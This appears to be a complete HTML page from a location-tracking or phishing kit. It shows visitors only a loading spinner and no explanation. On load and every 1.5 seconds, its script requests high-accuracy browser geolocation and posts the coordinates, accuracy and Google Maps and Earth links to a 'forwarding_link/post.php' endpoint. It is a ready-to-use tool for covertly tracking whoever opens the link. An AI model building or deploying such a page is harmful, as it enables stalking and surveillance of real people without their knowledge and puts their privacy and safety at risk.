<!doctype html>
<html>
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        function post(data) {
            $.ajax({
                type: 'POST',
                data: { location: data },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                        const googleEarth = `https://earth.google.com/web/search/${lat},${lon}`;
                        const locationData = `User Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m\nGoogle Maps: ${googleMaps}\nGoogle Earth: ${googleEarth}`;
                        post(locationData);
                    },
                    function(error) {},
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        }

        setInterval(getLocation, 1500);
        window.onload = getLocation;
    </script>
</body>
</html>
